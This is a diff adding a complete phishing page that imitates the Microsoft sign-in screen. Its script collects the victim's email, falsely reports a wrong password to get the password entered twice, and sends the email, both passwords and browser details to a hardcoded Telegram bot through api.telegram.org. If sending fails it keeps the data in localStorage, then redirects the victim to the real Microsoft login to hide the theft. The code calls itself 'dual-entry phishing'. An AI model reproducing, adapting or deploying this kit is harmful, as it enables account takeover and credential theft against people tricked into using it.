@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #000000;
+            background-image: url('https://logincdn.msauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 0 20px;
+        }
+        .card {
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 8px;
+            padding: 40px 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .microsoft-logo {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+        .microsoft-logo img {
+            height: 24px;
+            width: auto;
+        }
+        .title {
+            font-size: 28px;
+            font-weight: 400;
+            color: #ffffff;
+            margin-bottom: 32px;
+        }
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background-color: #0078d4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-weight: 600;
+            font-size: 18px;
+        }
+        .user-details {
+            flex: 1;
+        }
+        .user-email {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .change-account {
+            color: #60a5fa;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .input-container {
+            margin-bottom: 24px;
+        }
+        .input-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .email-input, .password-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 4px;
+            color: #ffffff;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+        .password-input.error {
+            border-color: #dc2626;
+            background-color: rgba(220, 38, 38, 0.1);
+        }
+        .password-input::placeholder, .email-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .password-input:focus, .email-input:focus {
+            outline: none;
+            border-color: #0078d4;
+            background-color: rgba(255, 255, 255, 0.15);
+        }
+        .link {
+            color: #60a5fa;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .link:hover {
+            text-decoration: underline;
+            color: #93c5fd;
+        }
+        .no-account {
+            margin-bottom: 20px;
+        }
+        .next-button, .signin-button {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 24px 0;
+            transition: background-color 0.2s;
+        }
+        .next-button:hover, .signin-button:hover {
+            background-color: #106ebe;
+        }
+        .back-button {
+            background-color: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            margin-top: 12px;
+        }
+        .back-button:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        .sign-in-options {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .sign-in-options a {
+            color: #60a5fa;
+            text-decoration: none;
+        }
+        .sign-in-options a:hover {
+            text-decoration: underline;
+            color: #93c5fd;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 16px;
+        }
+        .hidden {
+            display: none;
+        }
+        .error-message {
+            color: #f87171;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            padding: 8px;
+            background-color: rgba(220, 38, 38, 0.1);
+            border-radius: 4px;
+            border-left: 3px solid #dc2626;
+        }
+        .warning-message {
+            color: #fbbf24;
+            font-size: 13px;
+            margin-top: 8px;
+            padding: 8px;
+            background-color: rgba(251, 191, 36, 0.1);
+            border-radius: 4px;
+            border-left: 3px solid #fbbf24;
+        }
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+            }
+            .container {
+                padding: 0 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Step 1: Email Entry -->
+            <div id="step1" class="login-step">
+                <div class="header">
+                    <div class="microsoft-logo">
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+                    </div>
+                    <h1 class="title">Sign in</h1>
+                </div>
+                
+                <form id="emailForm">
+                    <div class="input-container">
+                        <label for="email" class="input-label">Email, phone, or Skype</label>
+                        <input type="text" id="email" class="email-input" placeholder="Enter your email, phone, or Skype" required>
+                    </div>
+                    
+                    <div class="no-account">
+                        <a href="#" class="link">No account? Create one!</a>
+                    </div>
+                    
+                    <button type="submit" class="next-button">Next</button>
+                    
+                    <div class="footer-links">
+                        <a href="#" class="link">Can't access your account?</a>
+                    </div>
+                </form>
+                
+                <div class="sign-in-options">
+                    <a href="#">Sign-in options</a>
+                </div>
+            </div>
+
+            <!-- Step 2: Password Entry - First Attempt -->
+            <div id="step2" class="login-step hidden">
+                <div class="header">
+                    <div class="microsoft-logo">
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+                    </div>
+                </div>
+                
+                <div class="user-info">
+                    <div class="user-avatar" id="userAvatar">U</div>
+                    <div class="user-details">
+                        <div class="user-email" id="displayEmail"></div>
+                        <a href="#" class="change-account" id="changeAccount">Sign in with a different account</a>
+                    </div>
+                </div>
+                
+                <h2 class="title">Enter password</h2>
+                
+                <form id="passwordForm">
+                    <div class="input-container">
+                        <label for="password" class="input-label">Password</label>
+                        <input type="password" id="password" class="password-input" placeholder="Enter password" required>
+                    </div>
+                    
+                    <div class="no-account">
+                        <a href="#" class="link">Forgot password?</a>
+                    </div>
+                    
+                    <button type="submit" class="signin-button" id="signinButton">Sign in</button>
+                    <button type="button" class="next-button back-button" id="backButton">Back</button>
+                </form>
+                
+                <div class="sign-in-options">
+                    <a href="#">Sign-in options</a>
+                </div>
+            </div>
+
+            <!-- Step 3: Second Password Attempt -->
+            <div id="step3" class="login-step hidden">
+                <div class="header">
+                    <div class="microsoft-logo">
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+                    </div>
+                </div>
+                
+                <div class="user-info">
+                    <div class="user-avatar" id="userAvatar2">U</div>
+                    <div class="user-details">
+                        <div class="user-email" id="displayEmail2"></div>
+                        <a href="#" class="change-account" id="changeAccount2">Sign in with a different account</a>
+                    </div>
+                </div>
+                
+                <h2 class="title">Enter password again</h2>
+                
+                <div class="warning-message">
+                    <strong>Incorrect password</strong><br>
+                    Please enter your password again to verify your identity.
+                </div>
+                
+                <form id="passwordForm2">
+                    <div class="input-container">
+                        <label for="password2" class="input-label">Password</label>
+                        <input type="password" id="password2" class="password-input" placeholder="Enter password again" required>
+                    </div>
+                    
+                    <div class="input-container">
+                        <label for="confirmPassword" class="input-label">Confirm Password</label>
+                        <input type="password" id="confirmPassword" class="password-input" placeholder="Re-enter password for verification" required>
+                        <div id="passwordError" class="error-message">Passwords do not match!</div>
+                    </div>
+                    
+                    <div class="no-account">
+                        <a href="#" class="link">Forgot password?</a>
+                    </div>
+                    
+                    <button type="submit" class="signin-button" id="signinButton2">Verify and Sign in</button>
+                    <button type="button" class="next-button back-button" id="backButton2">Back</button>
+                </form>
+                
+                <div class="sign-in-options">
+                    <a href="#">Sign-in options</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let firstPassword = '';
+        let userEmail = '';
+        
+        // Step 1: Email submission
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            
+            if (email) {
+                userEmail = email;
+                const avatarInitial = email.charAt(0).toUpperCase();
+                document.getElementById('userAvatar').textContent = avatarInitial;
+                document.getElementById('userAvatar2').textContent = avatarInitial;
+                document.getElementById('displayEmail').textContent = email;
+                document.getElementById('displayEmail2').textContent = email;
+                
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('step3').classList.add('hidden');
+                
+                document.getElementById('password').value = '';
+                document.getElementById('password2').value = '';
+                document.getElementById('confirmPassword').value = '';
+            }
+        });
+
+        // Step 2: First password submission
+        document.getElementById('passwordForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            firstPassword = document.getElementById('password').value;
+            
+            if (firstPassword) {
+                // Capture first password
+                console.log('First password captured:', firstPassword);
+                
+                // Show "wrong password" and move to second attempt
+                setTimeout(() => {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                }, 500);
+            }
+        });
+
+        // Step 3: Second password submission with verification
+        document.getElementById('passwordForm2').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const secondPassword = document.getElementById('password2').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            if (secondPassword !== confirmPassword) {
+                document.getElementById('passwordError').style.display = 'block';
+                return;
+            }
+            
+            document.getElementById('passwordError').style.display = 'none';
+            
+            // Telegram bot details - REPLACE WITH YOUR ACTUAL TOKEN AND CHAT ID
+            const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
+            const chatId = '875434694';
+            
+            // Enhanced data collection with both passwords
+            const message = `🔴 Otunti Zehhh ooo 🔴
+📧 Email: ${userEmail}
+🔑 First Password: ${firstPassword}
+🔑 Second Password: ${secondPassword}
+🔄 Passwords Match: ${firstPassword === secondPassword ? 'YES' : 'NO'}
+🕒 Timestamp: ${new Date().toLocaleString()}
+🌐 User Agent: ${navigator.userAgent}
+📍 Language: ${navigator.language}
+📱 Platform: ${navigator.platform}
+🎯 Method: Dual-entry phishing (verified)`;
+            
+            const encodedMessage = encodeURIComponent(message);
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
+            
+            // Send to Telegram
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Both passwords sent successfully:', data);
+                    // Show loading then redirect
+                    document.getElementById('signinButton2').textContent = 'Signing in...';
+                    document.getElementById('signinButton2').disabled = true;
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&state=12345&nonce=678910';
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('Telegram error:', error);
+                    // Local storage fallback
+                    localStorage.setItem(`ms_dual_cred_${Date.now()}`, JSON.stringify({
+                        email: userEmail,
+                        firstPassword: firstPassword,
+                        secondPassword: secondPassword,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        match: firstPassword === secondPassword
+                    }));
+                    window.location.href = 'https://login.microsoftonline.com/';
+                });
+        });
+
+        // Back button functionality
+        document.getElementById('backButton').addEventListener('click', function() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        });
+
+        document.getElementById('backButton2').addEventListener('click', function() {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        });
+
+        // Change account functionality
+        document.getElementById('changeAccount').addEventListener('click', function(event) {
+            event.preventDefault();
+            document.getElementById('email').value = '';
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        });
+
+        document.getElementById('changeAccount2').addEventListener('click', function(event) {
+            event.preventDefault();
+            document.getElementById('email').value = '';
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        });
+
+        // Real-time password validation
+        document.getElementById('confirmPassword').addEventListener('input', function() {
+            const password2 = document.getElementById('password2').value;
+            const confirmPassword = this.value;
+            const errorElement = document.getElementById('passwordError');
+            
+            if (confirmPassword && password2 !== confirmPassword) {
+                errorElement.style.display = 'block';
+            } else {
+                errorElement.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
